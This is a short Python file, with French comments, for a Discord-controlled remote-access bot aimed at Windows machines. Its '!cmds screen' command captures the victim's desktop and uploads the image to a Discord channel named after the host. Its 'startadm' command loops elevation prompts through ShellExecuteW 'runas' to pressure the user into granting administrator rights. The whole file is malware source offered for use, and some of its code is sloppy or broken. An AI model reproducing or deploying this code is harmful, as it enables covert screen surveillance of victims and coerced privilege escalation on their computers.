import discord
from discord.ext import commands
import pyautogui
import socket
import os
import sys
import asyncio
import time
import threading
import ctypes

def adm():
    global rng
    rng = True
    while rng:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )

def start_adm():
    global worker_thread
    # Créer et démarrer le thread
    worker_thread = threading.Thread(target=adm)
    worker_thread.start()

def stop_adm():
    global rng
    rng = False
    # Attendre que le thread se termine
    worker_thread.join()
    print("Le thread a été arrêté.")


if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


TOKEN = 'your bot tokent here'
intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Connected as {bot.user.name}')


@bot.event
async def create_channel(ctx):
    system_name = socket.gethostname().lower()
    for guild in bot.guilds:
        existing_channel = discord.utils.get(guild.channels, name=system_name)
        if not existing_channel:
            await guild.create_text_channel(system_name)
            await ctx.send(f"Channel `{system_name}` created.")
            return
    await ctx.send(f"Channel `{system_name}` already exists.")



@bot.command()
async def cmds(ctx, cmd: str):
    if cmd == 'hepl':
        await ctx.send("test good")
    if cmd == 'screen':
        print('screen')
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        time.sleep(1)
        await ctx.send(file=discord.File("screenshot.png"))
    if cmd == 'stopadm':
        print('stop adm')
        stop_adm()
    if cmd == 'startadm':
        print('start adm')
        start_adm()
    





# Run the bot
bot.run(TOKEN)



